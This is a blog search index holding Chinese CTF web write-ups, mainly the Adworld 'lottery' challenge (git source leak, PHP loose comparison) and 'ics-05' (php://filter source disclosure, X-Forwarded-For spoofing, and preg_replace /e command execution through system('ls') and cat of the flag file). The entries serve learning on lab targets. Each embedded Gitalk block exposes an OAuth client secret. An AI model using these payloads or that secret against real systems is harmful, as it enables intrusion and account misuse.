<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF攻防世界-WEB-lottery</title>
    <url>/2019/12/27/ctf-lottery/</url>
    <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.目录遍历-git源码泄露
2.robots协议
3.PHP 弱类型比较

 <a id="more"></a>


 <div class="note info"><p>0x02 解题流程与思路</p></div>
 1.尝试测试网页，注册账号，购买彩票，攒足足够的钱，购买flag。
 1_1.尝试购买彩票，利用浏览器工具抓包，发现购买彩票时，数据通过api.php。

<p><img src="1.PNG" alt=""></p>
<p>2.尝试获取api.php源码，在CTF新手区时，其实我们做过类似的题目，robots协议，尝试查看robots.txt。可知网页存在.git源码泄露。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /.git/</span><br></pre></td></tr></table></figure></div>

<p>3.下载githack，遍历网页目录并下载<br>3_1.<a href="https://github.com/tigert1998/GitHack-py3" target="_blank">下载github-python3</a></p>
<p><img src="2.PNG" alt=""></p>
<p>4.文件存在我们需要的api.php，查看api.php代码，进行代码审计。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(<span class="string">'config.php'</span>);</span><br><span class="line">header(<span class="string">'Content-Type: application/json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> response(<span class="variable">$resp</span>)&#123;</span><br><span class="line">	die(json_encode(<span class="variable">$resp</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> response_error(<span class="variable">$msg</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = [<span class="string">'status'</span>=&gt;<span class="string">'error'</span>];</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="variable">$msg</span>;</span><br><span class="line">	response(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> require_keys(<span class="variable">$req</span>, <span class="variable">$keys</span>)&#123;</span><br><span class="line">	foreach (<span class="variable">$keys</span> as <span class="variable">$key</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!array_key_exists(<span class="variable">$key</span>, <span class="variable">$req</span>))&#123;</span><br><span class="line">			response_error(<span class="string">'invalid request'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">require_registered</span></span>()&#123;</span><br><span class="line">	<span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'name'</span>]) || !isset(<span class="variable">$_SESSION</span>[<span class="string">'money'</span>]))&#123;</span><br><span class="line">		response_error(<span class="string">'register first'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> require_min_money(<span class="variable">$min_money</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'money'</span>]))&#123;</span><br><span class="line">		response_error(<span class="string">'register first'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">'money'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; 0)&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span> = array();</span><br><span class="line">		session_destroy();</span><br><span class="line">		response_error(<span class="string">'invalid negative money'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$min_money</span>)&#123;</span><br><span class="line">		response_error(<span class="string">'you don\'</span> have enough money<span class="string">');</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if($_SERVER["REQUEST_METHOD"] != '</span>POST<span class="string">' || !isset($_SERVER["CONTENT_TYPE"]) || $_SERVER["CONTENT_TYPE"] != '</span>application/json<span class="string">')&#123;</span></span><br><span class="line"><span class="string">	response_error('</span>please post json data<span class="string">');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$data = json_decode(file_get_contents('</span>php://input<span class="string">'), true);</span></span><br><span class="line"><span class="string">if(json_last_error() != JSON_ERROR_NONE)&#123;</span></span><br><span class="line"><span class="string">	response_error('</span>invalid json<span class="string">');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">require_keys($data, ['</span>action<span class="string">']);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// my boss told me to use cryptographically secure algorithm </span></span><br><span class="line"><span class="string">function random_num()&#123;</span></span><br><span class="line"><span class="string">	do &#123;</span></span><br><span class="line"><span class="string">		$byte = openssl_random_pseudo_bytes(10, $cstrong);</span></span><br><span class="line"><span class="string">		$num = ord($byte);</span></span><br><span class="line"><span class="string">	&#125; while ($num &gt;= 250);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	if(!$cstrong)&#123;</span></span><br><span class="line"><span class="string">		response_error('</span>server need be checked, tell admin<span class="string">');</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	$num /= 25;</span></span><br><span class="line"><span class="string">	return strval(floor($num));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function random_win_nums()&#123;</span></span><br><span class="line"><span class="string">	$result = '</span><span class="string">';</span></span><br><span class="line"><span class="string">	for($i=0; $i&lt;7; $i++)&#123;</span></span><br><span class="line"><span class="string">		$result .= random_num();</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	return $result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function buy($req)&#123;</span></span><br><span class="line"><span class="string">	require_registered();</span></span><br><span class="line"><span class="string">	require_min_money(2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$money = $_SESSION['</span>money<span class="string">'];</span></span><br><span class="line"><span class="string">	$numbers = $req['</span>numbers<span class="string">'];</span></span><br><span class="line"><span class="string">	$win_numbers = random_win_nums();</span></span><br><span class="line"><span class="string">	$same_count = 0;</span></span><br><span class="line"><span class="string">	for($i=0; $i&lt;7; $i++)&#123;</span></span><br><span class="line"><span class="string">		if($numbers[$i] == $win_numbers[$i])&#123;</span></span><br><span class="line"><span class="string">			$same_count++;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	switch ($same_count) &#123;</span></span><br><span class="line"><span class="string">		case 2:</span></span><br><span class="line"><span class="string">			$prize = 5;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">		case 3:</span></span><br><span class="line"><span class="string">			$prize = 20;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">		case 4:</span></span><br><span class="line"><span class="string">			$prize = 300;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">		case 5:</span></span><br><span class="line"><span class="string">			$prize = 1800;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">		case 6:</span></span><br><span class="line"><span class="string">			$prize = 200000;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">		case 7:</span></span><br><span class="line"><span class="string">			$prize = 5000000;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">		default:</span></span><br><span class="line"><span class="string">			$prize = 0;</span></span><br><span class="line"><span class="string">			break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	$money += $prize - 2;</span></span><br><span class="line"><span class="string">	$_SESSION['</span>money<span class="string">'] = $money;</span></span><br><span class="line"><span class="string">	response(['</span>status<span class="string">'=&gt;'</span>ok<span class="string">','</span>numbers<span class="string">'=&gt;$numbers, '</span>win_numbers<span class="string">'=&gt;$win_numbers, '</span>money<span class="string">'=&gt;$money, '</span>prize<span class="string">'=&gt;$prize]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function flag($req)&#123;</span></span><br><span class="line"><span class="string">	global $flag;</span></span><br><span class="line"><span class="string">	global $flag_price;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	require_registered();</span></span><br><span class="line"><span class="string">	$money = $_SESSION['</span>money<span class="string">'];</span></span><br><span class="line"><span class="string">	if($money &lt; $flag_price)&#123;</span></span><br><span class="line"><span class="string">		response_error('</span>you don\<span class="string">' have enough money'</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$money</span> -= <span class="variable">$flag_price</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">'money'</span>] = <span class="variable">$money</span>;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="string">'Here is your flag: '</span> . <span class="variable">$flag</span>;</span><br><span class="line">		response([<span class="string">'status'</span>=&gt;<span class="string">'ok'</span>,<span class="string">'msg'</span>=&gt;<span class="variable">$msg</span>, <span class="string">'money'</span>=&gt;<span class="variable">$money</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> register(<span class="variable">$req</span>)&#123;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$req</span>[<span class="string">'name'</span>];</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'name'</span>] = <span class="variable">$name</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'money'</span>] = 20;</span><br><span class="line"></span><br><span class="line">	response([<span class="string">'status'</span>=&gt;<span class="string">'ok'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">switch (<span class="variable">$data</span>[<span class="string">'action'</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'buy'</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">'numbers'</span>]);</span><br><span class="line">		buy(<span class="variable">$data</span>);</span><br><span class="line">		<span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">'flag'</span>:</span><br><span class="line">		flag(<span class="variable">$data</span>);</span><br><span class="line">		<span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">'register'</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">'name'</span>]);</span><br><span class="line">		register(<span class="variable">$data</span>);</span><br><span class="line">		<span class="built_in">break</span>;</span><br><span class="line">	</span><br><span class="line">	default:</span><br><span class="line">		response_error(<span class="string">'invalid request'</span>);</span><br><span class="line">		<span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> (1)requests是json格式<br>（2）玩家输入的彩票数字与系统随机生成的数字对比为==弱比较<br>（3）并且比较为一位一位的比较</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=0; <span class="variable">$i</span>&lt;7; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">```bash</span><br><span class="line"></span><br><span class="line">5.已知为php弱比较型，利用Burp Suite传包，进行数字比较时，使得任何数字都与系统生成数字相等，即ture。</span><br><span class="line">post数据是action，调用buy函数。以及我们输入的数字number。不停的传包，使得我们获得足够的钱，购买flag。</span><br><span class="line">```bash</span><br><span class="line">&#123;<span class="string">"action"</span>:<span class="string">"buy"</span>,<span class="string">"numbers"</span>:[<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>]&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="3.PNG" alt=""></p>
<div class="note info"><p>0x04 参考</p></div>
1.<a href="https://www.jianshu.com/p/911ec94e8259" target="_blank">lottery!（about /.git）</a><br>


<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      <categories>
        <category>CTF-WEB</category>
      </categories>
      <tags>
        <tag>目录遍历</tag>
        <tag>git源码泄露</tag>
        <tag>robots协议的利用</tag>
        <tag>代码审计</tag>
        <tag>PHP 弱类型比较</tag>
      </tags>
  </entry>
  <entry>
    <title>post-boko1</title>
    <url>/2019/12/24/post-boko1/</url>
    <content><![CDATA[<p>— title: post_boko1 date: 2019-12-24 11:06:00 tags: — </p>
]]></content>
  </entry>
  <entry>
    <title>CTF攻防世界-WEB-cis05</title>
    <url>/2019/12/24/ctf-ics-05/</url>
    <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>

<p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
 <a id="more"></a>


<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开题目网页点击尝试，发现只有维护中心可以点击

<p><img src="1.png" alt=""></p>
<br>

<ol start="2">
<li>F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。</li>
</ol>
<br>
2_1.
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p><img src="2.PNG" alt=""></p>
<br>

<p>3.转码获得源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>3_1.代码审计<br>（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP<br>（1_1）可以看到我们登陆成功<br><img src="3.PNG" alt=""></p>
<p>（2）<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>    简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
<p>（2_2）利用漏洞寻找flag<br>    %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="4.PNG" alt=""></p>
<p>(2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="5.PNG" alt=""><br>（2_4）找到flag文件夹后，继续cd，寻找所需的flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="6.PNG" alt=""><br>(2_5)确认flag所在的文件，直接抓取内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="7.PNG" alt=""><br>成功找到flag</p>
<div class="note info"><p>0x03 解题过程中存在的问题</p></div>
1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试



<div class="note info"><p>0x04 参考</p></div>
1.<a href="https://blog.csdn.net/zhwho/article/details/100694073" target="_blank">攻防世界web进阶ics-05 wp</a><br>
2.<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>
3.<a href="https://blog.csdn.net/About23/article/details/95349625" target="_blank">攻防世界ics-5wp</a><br>



<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      <categories>
        <category>CTF-WEB</category>
      </categories>
      <tags>
        <tag>php内置filter协议</tag>
        <tag>伪造IP</tag>
        <tag>preg_replace()函数的/e漏洞</tag>
        <tag>正确的php system()函数的书写</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF攻防世界-WEB-cookie基础题</title>
    <url>/2019/12/24/pb%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<div class="note info"><p>0x01 攻防世界web新手区cookie题</p></div>
    常规网上搜到的都是用burp suits做的，其实没必要这么麻烦，查看问题的讨论发现可以直接通过火狐浏览器 F12查看存储，获得cookie，然后查看网络获得flag <br>
    Chrome浏览器可以通过控制台输入alert(document.cookie)查看cookie cookie
<div class="note info"><p>0x02 图流程</p></div>

<p><img src="2.png" alt=""></p>
<p><img src="1.png" alt=""></p>
<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      <categories>
        <category>CTF-WEB基础</category>
      </categories>
      <tags>
        <tag>抓包基础题</tag>
      </tags>
  </entry>
  <entry>
    <title>低估的Web威胁-备份文件</title>
    <url>/2019/12/24/%E4%BD%8E%E4%BC%B0%E7%9A%84Web%E5%A8%81%E8%83%81/</url>
    <content><![CDATA[<div class="note info"><p>0x01代码编辑器产生的备份文件</p></div>
    文本编辑器和代码编辑器通常对正在编辑的文件会事先产生一个备份文件，这样做的目的是让出问题后可以恢复文件。
    例如：对一个名为index.php的文件进行编辑，自动创建的备份文件将会被命名成“index.php.save”。其他的代码编辑器也是一样的，都有一套自己的备份规则。
<div class="note danger"><p>0x02没有删除版本控制系统产生的备份文件</p></div>
    几乎所有的控制系统VCS都会在工程目录下建一个meta目录，这个文件记录了整个项目工程每次修改的记录。
而开发者修改项目仓库的时候就直接下载/克隆代码仓库，改为后直接上传到web服务器上。但是很多时候，VCS产生的目录并没有删除掉，这样的话，如果被攻击者找到，将会使整个工程泄露。

<div class="note default">
            <p>default </p>
          </div>






<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gif 二进制转字符串</span></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">a = <span class="string">'01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101'</span></span><br><span class="line">b = re.findall(r<span class="string">'.&#123;8&#125;'</span>,a)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += chr(int(i,2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>备份文件</tag>
        <tag>CTF-WEB基础知识</tag>
      </tags>
  </entry>
</search>
